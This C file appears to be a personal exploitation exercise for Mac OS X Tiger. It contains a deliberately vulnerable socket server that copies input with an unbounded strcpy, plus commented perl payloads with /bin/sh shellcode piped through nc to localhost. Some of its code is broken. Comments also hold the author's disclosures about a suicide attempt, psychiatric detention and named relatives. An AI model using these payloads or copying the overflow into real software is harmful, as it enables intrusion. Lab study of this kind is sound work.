#include <stdio.h>
#include <string.h>
#include <math.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>

/* FINAL DRAFT: perl -e 'print "A" x 504 . "BBBB" . "CCCC" . "DDDD" . "EEEE" . "FFFF" . "GGGG" . "HHHH" . "IIII" . "JJJJ" . "KKKK" . "\xCC\xCC\xCC\xCC" . "MMMM" . "NNNN" . "OOOO" . "PPPP" . "QQQQ" . "RRRR" . "SSSS" . "TTTT" . "UUUU" . "VVVV" . "WWWW" . "XXXX" . "YYYY" ends here . "ZZZZ" . "\x60" x 10 . "\x7c\xa5\x2a\x79\x40\xa2\xff\xfd\x7f\xe8\x02\xa6\x3b\xff\x01\x30\x38\x7f\xfe\xf4\x90\x61\xff\xf8\x90\xa1\xff\xfc\x38\x81\xff\xf8\x3b\xc0\x76\x01\x7f\xc0\x4e\x70\x44\xff\xff\x02/bin/sh"' | nc -nv 127.0.0.1 80 */

/* FINAL DRAFT: perl -e 'print "A" x 504 . "BBBB" . "CCCC" . "DDDD" . "EEEE" . "FFFF" . "GGGG" . "HHHH" . "IIII" . "JJJJ" . "KKKK" . "\xbf\xff\xfb\xcc" . "\x7c\xa5\x2a\x79\x40\xa2\xff\xfd\x7f\xe8\x02\xa6\x3b\xff\x01\x30\x38\x7f\xfe\xf4\x90\x61\xff\xf8\x90\xa1\xff\xfc\x38\x81\xff\xf8\x3b\xc0\x76\x01\x7f\xc0\x4e\x70\x44\xff\xff\x02/bin/sh" . "\x00\x00\x0A\x0D" x 2' | nc -nv 127.0.0.1 2481 */
/* 0xbffffbc0 */
/* I love you Tai */

/* In 2009 I attempted suicide via overdose eating a box of olanzapine, fluvoxamine and benzodiazpines, went into a coma to save my life and was placed on life support. Shortly thereafter returned to maximum security mental health facility after Tweed Hospital */

/* As the story goes, returned to school with no friends left (none that didn't leave in Year 10 or were shortly about to, so dropped out */

/* Then, over the course of years I just sat there and realised how much Tai had got into my head with sorts of shit. One was turning my hand away from television, entertainment and news, one was making me ponder absolutely spurious and insignificant things, one was people, how they thought, what they meant by things */

/* So, as it were, my brother, who was somewhat a prodigy in Greek Mythology and Roman History, dating back to before the age he was 10 reading large volumes of both, a very intellectually devoted person from that time, much thanks to our parents and grandparents (our grandparents very affluent from a 50+ year car-dealership and repair business, owning eventually Australia's largest car-importation business) we very much had a cultured, curious and intellectual side. Our grandparents Wal & June Truscott owned a business that sold for over 40 million, Truscott's Toyota */

/* Was glad to see a media organisation archivist devote a YouTube channel to a single clip of a circa 1970s Truscott's Toyota ad */

/* On the other hand, I am very thankful for my father, Mark Watters, his lifelong devotion to Tai and I and our wellbeing, successes and comfort */

/* My Uncle Rodney Watters was also someone very proficient in technology. In terms of genealogical theories of any sort of way of describing structured, predisposed human behaviour, if it is so that genealogical theories of learning allow for a very predictable lineage to inherit certain traits, then I would see any technology side came from not just nurture (since 1999 I have been tinkering with computers, Windows 95, ath0 ping of death, LinkNet Byron Bay's first ISP, Javascript malware, IIS < 5.0 buffer overflows) but from the Watters side of my lineage */

/* Tai and I are half-brothers, but look identical in some facial structure, e.g. similar brow, stiff upper lip, similar eye shape */

/* But he has blonde hair and I have black hair */

/* Thanks, very very much, proud of this one */ 
/* ********************		*********************		********************
	   *			*		    *			  *
	   *			*********************			  *
	   *			*		    *			  *
	   *			*		    *			  *
	   *			*		    *			  *
	   *			*		    *		********************	*/

/* MAC OS X 10.4 Tiger simple buffer overflow, maintains stderr, stdout and stdin over TCP/IP AF_INET socket, no NX or ASLR */

/* Charles Thomas Wallace Truscott Watters, Byron Bay / Suffolk Park NSW 2481 Australia at Github.com/r0ss1n1 */
/* With the idea for demonstrating things (in a basic way) using TCP/IP sockets, stacks, and heaps from the course
	'pwnallthethings', former GCHQ instructor */

int test(void);

int main(void) {

	int sock_file_descriptor;
	int new_sock_file_descriptor;
	int port_number;
	int client_length;
	struct sockaddr_in server_address;
	struct sockaddr_in client_address;
	char p[1000];
	int q;
	char r[500];
	int s;

	sock_file_descriptor = socket(AF_INET, SOCK_STREAM, 0);

	if (sock_file_descriptor < 0) {
		printf("Invoking the socket failed\n");
	}

	port_number = 1993;

	server_address.sin_family = AF_INET;
	server_address.sin_addr.s_addr = INADDR_ANY;
	server_address.sin_port = htons(port_number);	

	if(bind(sock_file_descriptor, (struct sockaddr *) &server_address, sizeof(server_address)) < 0) {
		printf("Invoking bind failed\n");
	}

	listen(sock_file_descriptor, 5);
	client_length = sizeof(client_address);

	new_sock_file_descriptor = accept(sock_file_descriptor, (struct sockaddr *) &client_address, (socklen_t *) &client_length);

	if (new_sock_file_descriptor < 0) {
		printf("Invoking accept failed\n");
	}
	/* x7c\xa5\x2a\x79\x40\xa2\xff\xfd\x7f\xe8\x02\xa6\x3b\xff\x01\x30\x38\x7f\xfe\xf4\x90\x61\xff\xf8\x90\xa1\xff\xfc\x38\x81\xff\xf8\x3b\xc0\x76\x01\x7f\xc0\x4e\x70\x44\xff\xff\x02/bin/sh */

	read(new_sock_file_descriptor, p, 1000);
	strcpy(r, p);
	s = write(new_sock_file_descriptor, "ACKNOWLEDGEMENT\n");
	printf("%p", * test);
	if (s < 0) {
		printf("Error writing to socket (sending protocol response)\n");
	}

	for(q = 0; q <= 20; ++q) {
		printf("%c", p[q]);
	}

	
	return 0;
}

int test(void) {

	printf("You win\n");


}
